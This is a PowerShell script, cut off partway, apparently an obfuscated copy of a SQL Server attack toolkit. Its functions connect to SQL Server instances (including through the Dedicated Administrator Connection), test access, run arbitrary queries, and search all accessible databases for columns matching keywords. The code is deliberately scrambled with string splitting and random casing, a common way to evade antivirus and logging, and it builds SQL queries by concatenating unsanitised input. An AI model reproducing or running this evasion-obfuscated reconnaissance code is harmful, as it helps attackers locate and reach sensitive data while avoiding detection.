SV  4fn ([tYPE]("{2}{1}{0}{3}" -f'em.Bitcon','ysT','s','veRTEr')) ; Set-Item ("vArIaB"+"lE:2"+"is0"+"X")  (  [typE]("{2}{1}{0}"-F'ErT','OnV','c')  ) ; Function GE`T-CO`MpuTEr`NAMeF`ROMI`NsTaN`Ce {
    [CmdletBinding()]
    Param(          
        [Parameter(mANDaTOry = ${Fal`SE},
        hELPmEsSAge = {"{4}{2}{3}{0}{1}"-f' instance','.','Serve','r','SQL '})]
        [string]${InS`T`A`NCE}
    ) 
    If (${i`NsT`A`Nce}){${compu`TErNa`Me} = ${I`NSt`AnCE}.("{0}{1}" -f 's','plit').Invoke('\')[0].("{0}{1}" -f'spl','it').Invoke(',')[0]}
    else{${C`O`MPuT`ernAMe} = ${E`N`V`:COmp`Ut`eRNAmE}}
    Return ${C`OmpUteRn`A`mE}
}
Function GeT`-SQ`l`C`oNNeCtIo`NoBj`Ect {
    [CmdletBinding()]
    Param(
        [Parameter(ManDaTORy = ${faL`se},
        HelpMesSAGe = {"{0}{11}{1}{7}{12}{9}{2}{8}{10}{5}{6}{3}{4}"-f 'S','L Server or domain','t to','wi','th.','ti','cate ',' ac',' aut','oun','hen','Q','c'})]
        [string]${uSer`N`AMe},
        [Parameter(MAnDATORY = ${FA`LSe},
        HeLpMESSagE = {"{0}{1}{7}{2}{3}{10}{8}{9}{4}{6}{5}" -f'SQL Ser','ver',' acc','oun','ticate ','h.','wit',' or domain',' password to',' authen','t'})]
        [string]${P`ASs`woRD},
        [Parameter(MaNdatORY = ${Fa`l`Se},
        HeLPMEssaGe = {"{3}{2}{6}{4}{0}{1}{5}"-f'ec','ti','stanc','SQL Server in',' to conn','on to.','e'})]
        [string]${INSt`AN`Ce},
        [Parameter(mandAtoRy = ${f`ALsE},
        HelPMESSAge = {("{0}{6}{3}{1}{7}{4}{5}{2}" -f'De','nistrato','C).',' Admi','ction (D','A','dicated','r Conne')})]
        [Switch]${d`Ac},
        [Parameter(manDAtoRY = ${f`Al`SE},
        helPmEsSAge = {"{7}{1}{6}{2}{5}{3}{4}{0}" -f'ct to.','ault dat','base','nn','e',' to co','a','Def'})]
        [String]${D`AT`ABAsE},
        [Parameter(MAndaTOrY = ${f`ALSe},
        HELpMESSAge = {"{2}{3}{0}{1}" -f'timeout','.','C','onnection '})]
        [string]${T`ImE`out} = 1
    )
    Begin {           
        if(${D`Ac}){${DAC`c`ONN} = ("{0}{2}{1}"-f 'ADM','N:','I')}else{${DA`Cco`NN} = ''}
        if(-not ${dA`T`A`BAsE}){${dA`TABA`Se} = ("{1}{0}" -f 'ter','Mas')}
    } Process {
        if (-not ${inS`TANcE}) { ${i`NstA`NCe} = ${eNV:C`oM`pu`TeR`NAME} }
        ${C`OnneC`TIOn} = &("{2}{3}{0}{1}" -f'j','ect','New-','Ob') -TypeName ("{8}{5}{0}{10}{1}{9}{4}{7}{3}{2}{6}"-f'm','at','lConnec','.Sq','qlCli','te','tion','ent','Sys','a.S','.D')
        if(-not ${U`S`ER`NamE}) {
            ${a`Ut`He`N`TICAtiontyPe} = ("{5}{6}{1}{7}{0}{2}{4}{3}"-f'de','ndo','nti','ls','a','Curren','t Wi','ws Cre')
            ${CoN`NeCt`I`On}."connEcT`i`ONs`T`Ri`NG" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+'Se'+'cu'+'rity='+'SSPI;Con'+'nection '+'Tim'+'e'+'out'+'=1')
        }
        elseif (${useR`N`AMe} -like "*\*") {
            ${A`UthEntI`cA`TIoNTy`pE} = ("{6}{5}{3}{1}{0}{2}{4}"-f 'n','de','tia','dows Cre','ls','n','Provided Wi')
            ${conn`E`cTION}."C`o`Nn`eCtIoN`STRINg" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+"Security=SSPI;uid=$Username;pwd=$Password;Connection "+"Timeout=$TimeOut")
        }
        elseif ((${u`SeRn`AME}) -and (${U`sEr`NaMe} -notlike "*\*")) {
            ${aUthen`TIc`ATI`o`Nt`Ype} = ("{0}{2}{1}{3}" -f'Pr','gi','ovided SQL Lo','n')
            ${c`OnNE`C`TiON}."co`NnecTIONsT`R`iNG" = ("Server=$DacConn$Instance;Database=$Database;User "+"ID=$Username;Password=$Password;Connection "+"Timeout=$TimeOut")
        }
        return ${c`ONNe`cti`On}
    } End {                
    }
}
Function gET`-sql`cOn`NeC`TI`ont`Est {
    [CmdletBinding()]
    Param(
        [Parameter(MaNDAToRy = ${fa`L`Se},
        helPMessAgE = {"{12}{9}{5}{11}{14}{6}{8}{7}{1}{13}{0}{2}{10}{4}{3}"-f'o','ccount ',' au','with.','icate ','er','dom','n a','ai',' Serv','thent',' or','SQL','t',' '})]
        [string]${us`ERNAme},
        [Parameter(maNdatORY = ${f`AL`sE},
        heLPmeSsAgE = {"{7}{8}{9}{1}{4}{0}{6}{3}{10}{5}{2}" -f 'unt passwor','main a','.','en','cco','icate with','d to auth','SQL Server or ','d','o','t'})]
        [string]${p`A`SSWOrD},
        [Parameter(ManDAtoRy = ${FA`lse},
        HeLpMeSsAge = {"{0}{3}{2}{1}{5}{6}{4}" -f'SQL Server instanc','e','conn','e to ','n to.','cti','o'})]
        [string]${I`NS`TAnCe},
        [Parameter(MandaTorY = ${F`ALsE},
        helPMeSsAGe = {"{5}{1}{7}{4}{2}{0}{3}{8}{6}" -f'ted Admin','ect ','ing Dedica',' Conne','s','Conn','n.','u','ctio'})]
        [Switch]${D`AC},
        [Parameter(mANDatory = ${FaL`SE},
        hELpmessAGE = {"{1}{7}{9}{6}{2}{0}{4}{3}{5}{8}" -f' to ','Def','atabase','c','conne','t t','d','au','o.','lt '})]
        [String]${dA`Ta`BASE},
        [Parameter(mAndatORY = ${fA`LsE},
        HelPMESsAGE = {"{0}{3}{4}{5}{2}{6}{1}"-f'Co','timeout.','cti','n','n','e','on '})]
        [string]${TI`mE`ouT}
    )
    Begin {
        ${TBl`ResU`l`Ts} = &("{0}{1}{2}" -f 'Ne','w','-Object') -TypeName ("{4}{3}{2}{0}{1}" -f 'ata.DataTab','le','stem.D','y','S')
        ${NU`lL} = ${t`Blr`E`suLTs}."coLu`M`Ns".("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}" -f 'e','erNam','Comput'))
        ${n`Ull} = ${TBLRe`su`LTS}."Co`Lu`MNS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{2}" -f'anc','Inst','e'))
        ${n`Ull} = ${tb`LR`e`Sults}."c`OL`UMnS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f 'tus','Sta'))
    } Process {
        if(-not ${In`sT`ANCe}) { ${IN`S`TancE} = ${E`N`V:COmP`U`TERn`Ame} }
        ${C`omPu`TER`N`AmE} = &("{0}{3}{1}{4}{5}{2}{6}"-f 'Get-ComputerNam','m','ta','eFro','I','ns','nce') -Instance ${iNs`TaN`Ce}
        if(${d`Ac}) {
            ${c`o`NNEct`iOn} = &("{0}{1}{4}{2}{3}"-f'Get-','SQLConnect','nObj','ect','io') -Instance ${in`stan`ce} -Username ${uSeR`NA`mE} -Password ${pA`SswO`Rd} -DAC -TimeOut ${TiME`OUt} -Database ${DA`T`ABaSe}
        } else {
            ${cOnN`E`cTI`oN} = &("{1}{0}{3}{2}" -f't-SQLConnect','Ge','ect','ionObj') -Instance ${I`Ns`TaNce} -Username ${US`eRn`AmE} -Password ${pas`SWo`RD} -TimeOut ${TIme`O`UT} -Database ${D`ATaBASE}
        }
        try {
            ${cO`NNEc`TIon}.("{1}{0}" -f 'n','Ope').Invoke()
            ${NU`Ll} = ${tBlR`eS`UlTs}."R`ows".("{1}{0}"-f'd','Ad').Invoke("$ComputerName","$Instance",("{3}{1}{0}{2}"-f 'bl','essi','e','Acc'))
            ${C`o`NNection}.("{1}{0}" -f'e','Clos').Invoke()
            ${COnn`eCti`ON}.("{0}{2}{1}" -f'D','spose','i').Invoke()
        } catch {
            ${Er`RormES`sAGe} = ${_}."e`xc`E`PtIon"."mE`s`sagE"
            ("$Instance "+': '+'Co'+'nnect'+'i'+'on '+'Fai'+'led.')
            ('Er'+'ro'+'r: '+"$ErrorMessage")
        }
            ${nU`ll} = ${T`BlrEs`U`LTs}."RO`Ws".("{1}{0}" -f'd','Ad').Invoke("$ComputerName","$Instance",("{2}{1}{0}" -f 'ble','ccessi','Not A'))
    } End {
        ${tb`LR`ES`ULTS}
    }
}
Function ge`T-`Sql`Qu`ErY2 {
    [CmdletBinding()]
    Param(
        [Parameter(manDatoRy = ${FA`LSe},
        heLpmeSSAge = {"{0}{3}{4}{2}{6}{8}{1}{7}{5}"-f 'SQL S','nt',' domain acc','erver',' or','h.','ou','icate wit','nt to authe'})]
        [string]${Us`eR`NAme},
        [Parameter(MaNDaTory = ${fal`se},
        hELpmEsSagE = {"{8}{6}{2}{13}{7}{11}{1}{4}{10}{3}{12}{9}{5}{0}"-f'with.','t pas','or domain',' ','sword',' ','L Server ','o','SQ','e',' to','un','authenticat',' acc'})]
        [string]${Pa`sS`w`OrD},
        [Parameter(mAndAToRy = ${FA`l`SE},
        HeLpmessAgE = {"{8}{2}{5}{0}{1}{3}{4}{6}{9}{7}" -f 'ver',' inst','L','ance',' to',' Ser',' con','.','SQ','nection to'})]
        [string]${i`N`ST`ANcE},
        [Parameter(mAnDATory = ${f`A`LsE},        
        hELPmESSAGe = {"{2}{0}{1}{3}"-f 'e','rver','SQL S',' query.'})]
        [string]${que`RY},
        [Parameter(MAnDAToRY = ${Fa`lSE},
        hELpmessaGe = {"{7}{6}{3}{4}{2}{0}{1}{5}" -f 'onnec','tion','edicated Admin C','nect',' using D','.','on','C'})]
        [Switch]${d`Ac},
        [Parameter(MandaTOry = ${fa`L`Se},
        HElpmESSage = {"{0}{1}{5}{2}{3}{6}{4}"-f 'Def','a',' data','base to con','ct to.','ult','ne'})]
        [String]${d`Ata`Base},
        [Parameter(MaNdaTory = ${Fa`lsE},
        HelPMesSaGe = {"{0}{3}{1}{2}"-f'C','nect','ion timeout.','on'})]
        [int]${tI`mEO`Ut},
        [Parameter(MaNdATory = ${f`AlSe},
        hELPMESSAge = {"{2}{1}{5}{3}{4}{0}" -f'xists.','etu','R','n e','rror message if e','r'})]
        [switch]${rET`UrN`eRrOr}
    )
    Begin {
        ${tB`LqUerY`ReS`UL`Ts} = &("{2}{3}{1}{0}" -f 'ject','Ob','N','ew-') -TypeName ("{2}{1}{4}{3}{0}"-f 'ble','.','System.Data','taTa','Da')
    } Process {      
        if(${d`AC}){${CO`NNE`c`TIOn} = &("{3}{1}{2}{0}{6}{5}{4}"-f'onne','Q','LC','Get-S','ct','je','ctionOb') -Instance ${IN`stAn`Ce} -Username ${user`N`AmE} -Password ${PAs`Swo`RD} -TimeOut ${Ti`m`EOut} -DAC -Database ${DAtAB`ASe}}
        else{${Co`NNEc`T`Ion} = &("{2}{5}{1}{6}{3}{4}{0}"-f'ject','SQLCon','G','n','Ob','et-','nectio') -Instance ${iN`STA`NcE} -Username ${Use`R`NAme} -Password ${P`AsS`WO`Rd} -TimeOut ${t`I`meOuT} -Database ${Da`T`A`BasE}}
        ${coNNE`ctIoNs`TRi`NG} = ${cO`Nnec`TIoN}."cO`NNEC`TIOnST`R`ing"
        ${I`Ns`TANcE} = ${cON`Ne`CtI`on`StriNG}.("{1}{0}"-f't','spli').Invoke(';')[0].("{1}{0}"-f 'lit','sp').Invoke('=')[1]
        if(${QuE`RY}) {
            ${CON`Ne`CTi`On}.("{0}{1}" -f'Op','en').Invoke()
            ("$Instance "+': '+'Connect'+'io'+'n '+'Succes'+'s.')
            ${CoMM`AnD} = &("{2}{1}{0}" -f 'ect','j','New-Ob') -TypeName ("{5}{1}{4}{0}{3}{2}"-f 'S','ient','and','qlComm','.','System.Data.SqlCl') -ArgumentList (${qU`Ery}, ${COn`NE`CT`ion})
            try {
                ${re`Su`LtS} = ${c`oM`manD}.("{2}{0}{3}{1}{4}"-f'ec','Re','Ex','ute','ader').Invoke()                                             
                ${tblQu`ErYresU`Lts}.("{0}{1}"-f 'Loa','d').Invoke(${rES`U`LTS})  
            } catch {
                
            }                                                                                    
            ${c`ONN`ecT`IoN}.("{0}{1}"-f'Clos','e').Invoke()
            ${Co`NNEc`T`Ion}.("{2}{0}{1}" -f 'ispo','se','D').Invoke() 
        }
        else{("{2}{3}{5}{1}{10}{4}{9}{12}{8}{7}{11}{0}{6}" -f 'tio','provided ','No',' ','Get-S','query ','n.','fun','ry ','QLQu','to ','c','e');Break}
    } End {   
        if(${RE`TurnERR`oR}){${ErrO`RM`e`s`SagE}}
        else{${Tbl`QueryrES`UL`TS}}                  
    }
}
Function  GEt-`S`q`LqUERY {
    [CmdletBinding()]
    Param(
        [Parameter(mANDatoRy = ${FA`LsE},
                VALueFrompIpELINeBYpROPERtynAME = ${T`RuE},
        HELpMeSSAgE = {"{11}{10}{6}{5}{8}{7}{3}{12}{0}{9}{4}{1}{2}"-f 'uth','wit','h.','o ','icate ','m','r do','nt t','ain accou','ent','rver o','SQL Se','a'})]
        [string]${UseR`N`AmE},
        [Parameter(MANDaTOry = ${fa`L`se},
                vAlueFRoMpipElINEbyPRoPertyNAMe = ${TR`UE},
        HELpmessAge = {"{3}{14}{9}{1}{7}{6}{2}{10}{17}{16}{15}{11}{5}{13}{8}{12}{0}{4}"-f'cate',' ','ou','SQL ',' with.','a','in acc','doma','he','rver or','nt pa','o ','nti','ut','Se','t','rd ','sswo'})]
        [string]${p`AS`sWORd},
        [Parameter(MAndaTOrY = ${f`Al`sE},
                ValueFROMpIPElInEByPRoperTYnAME = ${T`RuE},
        HELpMeSSaGe = {"{3}{2}{0}{5}{7}{6}{4}{1}" -f 'erve','tion to.',' S','SQL','nnec','r','to co',' instance '})]
        [string]${inS`Tan`ce},
        [Parameter(maNdATORy = ${FA`lse},
                vaLUEfrOMPiPElINEbYPropErtyName = ${tR`Ue},
        HeLPMEssage = {"{3}{2}{4}{1}{5}{0}" -f'.','e','rver ','SQL Se','qu','ry'})]
        [string]${Q`UeRy},
        [Parameter(mANDAtorY = ${FA`L`sE},
        HElPmesSaGe = {"{6}{1}{4}{5}{0}{3}{2}{7}" -f 'dm','Dedica','ction','in Conne','ted',' A','Connect using ','.'})]
        [Switch]${D`AC},
        [Parameter(maNdatORY = ${fAL`sE},
        hELpmESsaGE = {"{1}{4}{3}{6}{7}{2}{0}{5}" -f't to','De','o connec','a','fault dat','.','base ','t'})]
        [String]${dAT`A`BAse},
        [Parameter(MAnDaTOry = ${fa`lsE},
        heLpmEssAGe = {"{3}{2}{4}{0}{1}{5}"-f 'ion time','ou','onne','C','ct','t.'})]
        [int]${t`I`MeouT},
        [Parameter(mandATOrY = ${FA`L`sE},
        HELpmEssagE = {"{1}{6}{8}{13}{0}{9}{4}{12}{2}{10}{11}{7}{5}{3}"-f 'bose erro','Su','ed wh','pped.','s.  ','wra','ppress ','ion is ','ve','r','e','n funct','Us','r'})]
        [switch]${SuPP`R`ess`VERBOSE},
        [Parameter(maNDatory = ${F`A`lsE},
        helpMeSSAGE = {"{1}{3}{2}{4}{0}{5}" -f ' if exist','Re',' error mess','turn','age','s.'})]
        [switch]${RE`T`URNe`RRor}
    )

    Begin {
        ${TBlQU`ERYRe`sUl`Ts} = &("{2}{1}{0}"-f'ect','w-Obj','Ne') -TypeName ("{2}{1}{0}{4}{3}"-f 'a.Data','ystem.Dat','S','e','Tabl')
    } Process {
        if(${D`Ac}) {
            ${Co`N`NeC`TIon} = &("{1}{0}{6}{4}{2}{3}{5}"-f'-','Get','nectionO','bjec','LCon','t','SQ') -Instance ${In`st`AnCE} -Username ${USE`R`NAME} -Password ${Pa`sSwO`Rd} -TimeOut ${tIMEO`Ut} -DAC -Database ${datAb`A`sE}
        } else {
            ${c`On`NE`ctIoN} = &("{0}{2}{1}{3}"-f 'Ge','ConnectionObj','t-SQL','ect') -Instance ${i`NSt`AnCE} -Username ${u`SERN`A`me} -Password ${PA`SSW`ord} -TimeOut ${tI`m`Eout} -Database ${Da`TABASE}
        }

        ${COn`Nec`TiONs`TRInG} = ${cONnEc`Ti`On}."CoNn`E`C`TiOns`TRIng"
        ${i`NS`Tan`CE} = ${C`ONn`eCtIoNstr`ing}.("{1}{0}" -f'lit','sp').Invoke(';')[0].("{0}{1}" -f 'spl','it').Invoke('=')[1]

        if(${Q`UE`RY}) {
            try {
                ${CON`NE`C`TIoN}.("{1}{0}" -f'pen','O').Invoke()
                ${CO`mMa`ND} = &("{2}{0}{1}{3}" -f'-','Obj','New','ect') -TypeName ("{5}{4}{6}{0}{3}{7}{1}{2}{8}"-f 'S','nt.','SqlCom','qlCli','s','Sy','tem.Data.','e','mand') -ArgumentList (${qU`E`RY}, ${ConnE`c`TioN})
                ${r`esul`Ts} = ${CoMM`And}.("{2}{1}{0}" -f'ader','ecuteRe','Ex').Invoke()
                ${TBLqueR`YR`ESu`lts}.("{0}{1}" -f 'Loa','d').Invoke(${ReS`ULtS})
                ${cO`NN`ectIoN}.("{0}{1}"-f'Cl','ose').Invoke()
                ${co`NNECT`i`on}.("{2}{0}{1}"-f'is','pose','D').Invoke()
            } catch {
                
            }
        }
        else
        {
            &("{0}{2}{1}"-f'Wri','e-Output','t') -InputObject ("{0}{9}{2}{10}{4}{8}{3}{5}{11}{6}{7}{1}" -f 'N','y function.',' ','ed to','r',' ','QLQ','uer','y provid','o','que','Get-S')
            Break
        }
    }

    End
    {
        ${tB`lQUer`YR`ESUlTs}
    }
}
Function G`et-sQ`l`CoLu`mn {
    [CmdletBinding()]
    Param(
        [Parameter(mandATORy = ${f`A`lSE},
                VAluEFROMPipELINebYPropertynAme = ${Tr`Ue},
        HElPMESsage = {"{2}{0}{4}{5}{8}{10}{7}{6}{9}{12}{3}{11}{1}" -f 'e','h.','SQL S','ate ','rver or ','dom','t',' ','ain ','o aut','account','wit','hentic'})]
        [string]${U`sE`RnAme},

        [Parameter(MandaToRY = ${fA`lse},
                VAlueFRompIPeliNEbYPRoPeRtYNaME = ${T`RUE},
        HeLpMeSsAGe = {"{9}{7}{0}{2}{11}{12}{5}{4}{10}{8}{6}{1}{3}"-f 'ver o','e ','r ','with.','t','o au','cat','Ser','i','SQL ','hent','domain account passw','ord t'})]
        [string]${pA`s`SwoRD},

        [Parameter(mAnDAToRY = ${faL`Se},
                VaLuEFRoMPiPEliNeBypROpERTynaMe = ${T`RUE},
        hElPmESsAGE = {"{1}{6}{5}{10}{0}{8}{9}{2}{3}{4}{7}{11}" -f 'tance to c','SQL S','n','ecti','on t',' i','erver','o','o','n','ns','.'})]
        [string]${in`StaN`CE},

        [Parameter(manDatOry = ${faL`SE},
                vaLUEfrOMPiPELINEBYPROPERtYNAme = ${t`Rue},
        helPmEssAGE = {"{4}{3}{2}{0}{1}"-f'abase ','name.','t','a','D'})]
        [string]${Da`T`Aba`SEnA`mE},

        [Parameter(MaNdaToRy = ${FA`lSe},
                VaLuefromPiPElInEBYPROPertYnamE = ${TR`Ue},
        heLpmEssAGe = {"{0}{2}{1}" -f'Tab',' name.','le'})]
        [string]${tabL`enA`ME},

        [Parameter(MAnDATORY = ${FAl`se},
                ValUeFROMpIpelIneBYPrOpERtYnaMe = ${TR`Ue},
        hElpMESsAge = {"{3}{5}{4}{0}{2}{1}" -f 'ct ','n name.','colum','F',' exa','ilter by'})]
        [string]${c`Olu`mNName},

        [Parameter(MAndAToRY = ${FAL`sE},
                vALUeFROMPIpeLinebypropErtYname = ${Tr`Ue},
        HeLpMESSAgE = {"{12}{2}{10}{3}{1}{6}{8}{4}{9}{11}{5}{0}{7}"-f 'li','wildcard','usi',' ','ch.','seperated ','s in sea','st.','r','  Supports com','ng','ma ','Column name '})]
        [string]${cOlUM`NN`AMeS`E`ARCh},

        [Parameter(MANDAtory = ${f`ALSe},
        hELPmESsaGE = {(("{10}{7}{2}{8}{12}{0}{11}{6}{4}{1}{9}{3}{5}"-f 'efau','as',' tabl','s','datab','.',' ',' select','es from ','e','DonDG0t','lt','d'))  -crePLace ([Char]68+[Char]71+[Char]48),[Char]39})]
        [switch]${nODe`FaUl`TS},

        [Parameter(ManDaTory = ${F`AL`sE},
        HeLPmEssaGe = {"{10}{11}{1}{9}{5}{3}{8}{2}{0}{7}{6}{4}"-f 'o','r',' functi','ors. ','.','err','ed','n is wrapp',' Used when','bose ','Suppress v','e'})]
        [switch]${SU`pPre`ssverbose}
    )

    Begin
    {
        
        ${TBl`Co`LUm`Ns} = &("{2}{0}{1}" -f'ew-Objec','t','N') -TypeName ("{2}{3}{0}{1}" -f'.','Data.DataTable','Syst','em')

        
        if(${TaBl`e`Name})
        {
            ${t`Ab`LenAmEf`iLT`Er} = (' '+'a'+'nd '+'T'+'A'+'BLE_N'+'AME '+'l'+'ike '+"'%$TableName%'")
        }
        else
        {
            ${taBL`eNa`m`EFiL`TEr} = ''
        }

        
        if(${C`OlU`MnN`AME})
        {
            ${Co`L`U`mNfiLtER} = (' '+'a'+'nd '+'colum'+'n'+'_n'+'ame '+'li'+'ke '+"'$ColumnName'")
        }
        else
        {
            ${co`lu`m`NF`ILteR} = ''
        }

        
        if(${CoLu`MnNa`MesE`ARCh})
        {
            ${CoLUm`Ns`EarCh`FiltER} = (' '+'and'+' '+'c'+'olumn_n'+'ame '+'lik'+'e '+"'%$ColumnNameSearch%'")
        }
        else
        {
            ${Co`l`U`MNs`EarC`hF`iLteR} = ''
        }

        
        if(${COl`UmNNA`meSE`Arch})
        {
            ${K`E`yworDS} = ${c`Olum`N`NaMESEAR`Ch}.("{1}{0}"-f'lit','sp').Invoke(',')

            [int]${i} = ${k`eYw`oRdS}."cOu`Nt"
            while (${i} -gt 0)
            {
                ${i} = ${I} - 1
                ${KE`Y`WORD} = ${keYwo`R`Ds}[${i}]

                if(${i} -eq (${K`eYw`oRDS}."c`OuNT" -1))
                {
                    ${Co`L`UM`N`sEArcHFiLTEr} = ('and'+' '+'c'+'o'+'lumn_na'+'me '+'like'+' '+"'%$Keyword%'")
                }
                else
                {
                    ${Co`lUm`NSEaRch`F`i`L`TeR} = ${coLUm`NSeaRcH`FilT`eR} + (' '+'or'+' '+'col'+'umn_name'+' '+'li'+'ke '+"'%$Keyword%'")
                }
            }
        }
    }

    Process
    {
        

        
        ${COm`Pu`TE`RnamE} = &("{8}{3}{0}{5}{4}{7}{6}{2}{1}"-f'uterNam','e','c','t-Comp','I','eFrom','tan','ns','Ge') -Instance ${i`N`sTAnCe}

        
        if(-not ${i`NStA`NCE})
        {
            ${iNs`Ta`Nce} = ${eNV:coMP`Ut`Er`NAME}
        }

        
        ${T`E`sTCOn`NECTiON} = &("{0}{4}{3}{2}{1}{5}"-f 'Get-SQL','tion','ec','n','Con','Test') -Instance ${I`N`StancE} -Username ${us`Erna`me} -Password ${PA`ss`WORD} | &("{1}{2}{0}" -f'ct','Whe','re-Obje') -FilterScript {
            ${_}."sT`ATUS" -eq ("{0}{1}{2}"-f'Acce','ss','ible')
        }
        if(${te`St`c`onnECT`IOn})
        {
            if( -not ${SU`P`pr`EssverB`OSE})
            {
                &("{3}{1}{2}{0}"-f 'e','Verb','os','Write-') -Message ("$Instance "+': '+'C'+'onne'+'cti'+'on '+'Succ'+'ess.')
            }
        }
        else
        {
            if( -not ${sUpP`ReSs`VE`RBOsE})
            {
                &("{1}{0}{2}" -f 'Verb','Write-','ose') -Message ("$Instance "+': '+'Conn'+'ec'+'tion'+' '+'Fa'+'iled.')
            }
            return
        }

        
        if(${nOd`E`FaUltS})
        {
            
            ${tB`lDaT`AbAseS} = &("{3}{4}{1}{2}{0}" -f'Database','SQ','L','G','et-') -Instance ${I`NsTa`Nce} -Username ${U`sER`Na`ME} -Password ${P`AsSwO`RD} -DatabaseName ${Dat`ABAs`E`N`AME} -HasAccess -NoDefaults
        }
        else
        {
            
            ${tBL`DaT`A`Ba`ses} = &("{0}{3}{1}{2}"-f 'G','atabas','e','et-SQLD') -Instance ${iNSTa`NCE} -Username ${US`eRN`Ame} -Password ${pA`S`sWoRD} -DatabaseName ${daT`Ab`AsENamE} -HasAccess
        }

        
        ${Tbl`D`ATab`ASES} |
        &("{3}{1}{0}{2}"-f'ach-Ob','orE','ject','F') -Process {
            
            ${Db`NaME} = ${_}."d`AtAbaS`eNAME"

            
            ${Q`UeRy} = (' '+' '+'USE'+' '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SEL'+'ECT'+' '+' '+"'$ComputerName' "+'a'+'s '+'['+'ComputerN'+'ame'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Ins'+'tanc'+'e],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TAB'+'LE_C'+'ATALO'+'G '+'A'+'S '+'['+'Dat'+'abaseNam'+'e],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TABLE_'+'S'+'CHE'+'MA '+'A'+'S '+'[S'+'c'+'hema'+'Name],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TA'+'BLE_N'+'A'+'ME '+'as'+' '+'[Tab'+'leN'+'am'+'e],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CO'+'LU'+'M'+'N_NAME '+'as'+' '+'['+'C'+'olumnName],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'AT'+'A_TYPE '+'as'+' '+'[Co'+'lumnDa'+'t'+'aT'+'ype],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CHARA'+'CTER_MA'+'XIMU'+'M'+'_LENGT'+'H'+' '+'as'+' '+'[Co'+'lumnM'+'axLeng'+'th]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"FROM	[$DbName].[INFORMATION_SCHEMA].[COLUMNS] "+'WHE'+'RE '+'1=1
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ColumnSearchFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ColumnFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$TableNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'RD'+'ER '+'BY'+' '+'TA'+'BLE'+'_CAT'+'A'+'LOG, '+'TABLE_'+'SCH'+'EM'+'A'+', '+'TABL'+'E'+'_'+'NAME')

            
            ${TB`L`ReSuLTS} = &("{1}{2}{0}"-f 'ery','Get-SQL','Qu') -Instance ${INstA`NCE} -Query ${QUE`RY} -Username ${u`sernAME} -Password ${p`As`sWOrD}

            
            ${T`BlC`oLuMns} = ${tB`L`col`UmnS} + ${Tb`lR`ESUlTs}
        }
    }

    End
    {
        
        ${tb`lcolU`M`NS}
    }
}
Function Get-`sQ`l`DaTab`Ase {
    [CmdletBinding()]
    Param(
        [Parameter(mANDAtoRy = ${FAL`SE},
        HElPmEssage = {"{8}{10}{12}{7}{4}{2}{1}{3}{6}{11}{5}{0}{9}"-f 'icate wit','ai','dom','n a','er or ','ent','ccou','v','S','h.','QL ','nt to auth','Ser'})]
        [string]${uSeR`N`A`mE},
        [Parameter(mANDAtorY = ${Fa`Lse},
        HElPMessage = {"{10}{8}{9}{7}{11}{1}{5}{4}{0}{6}{2}{3}"-f'uth','cco',' ','with.','rd to a','unt passwo','enticate','domain ',' Server or',' ','SQL','a'})]
        [string]${P`AssW`oRD},
        [Parameter(MaNDAtoRY = ${f`Al`se},
        VaLuEFrompipeLinebyProPERTynamE = ${T`RUe},
        hElpmeSsAgE = {"{8}{7}{9}{5}{1}{4}{10}{0}{6}{3}{2}"-f'o','instanc','o.','n t','e t','r ','nnectio','er','SQL S','ve','o c'})]
        [string]${I`N`sTA`NcE},
        [Parameter(MaNDATorY = ${f`ALSe},
        VALUEFRoMpipElinE = ${TR`UE},
        valueFROmPIPeLInebyPROpErTYNAMe = ${tr`Ue},
        helpMeSSage = {"{3}{1}{0}{2}" -f 'e','as',' name.','Datab'})]
        [string]${Da`Ta`BaSEN`AmE},
        [Parameter(MAndAtory = ${fAL`sE},
        helpmesSAge = {"{3}{1}{4}{2}{9}{7}{6}{5}{8}{0}" -f's.','ly select','d','On',' non ','ba',' data','t','se','efaul'})]
        [switch]${no`D`eF`AULTS},
        [Parameter(MandAToRy = ${fa`l`sE},
        HelPMEssaGE = {"{5}{2}{0}{11}{4}{7}{9}{10}{8}{3}{1}{6}" -f'lect dat','s ','ly se','cces','es the current','On','to.',' use',' a','r h','as','abas'})]
        [switch]${hAsAcC`e`Ss},
        [Parameter(mANDATorY = ${FA`LSe},
        HeLpmESsAge = {"{12}{3}{11}{10}{5}{8}{1}{9}{2}{6}{0}{7}{4}"-f 'ys','wne',' a ',' s','.','ect dat','s','admin','abases o','d by','l','e','Only'})]
        [switch]${S`y`SaDmIn`oNly},
        [Parameter(mAnDatORy = ${f`ALSe},
        HElPMeSSAge = {"{8}{4}{10}{7}{0}{6}{2}{5}{1}{3}{9}" -f'  Used when f','ra','nction is','p','s',' w','u','rbose errors.','Suppres','ped.',' ve'})]
        [switch]${SU`P`pREss`Ve`RBOSE}
    )

    Begin {
        ${tb`LR`ESults} = &("{1}{3}{0}{2}"-f'Objec','N','t','ew-') -TypeName ("{5}{2}{1}{4}{0}{3}" -f 'ta.','m.D','te','DataTable','a','Sys')
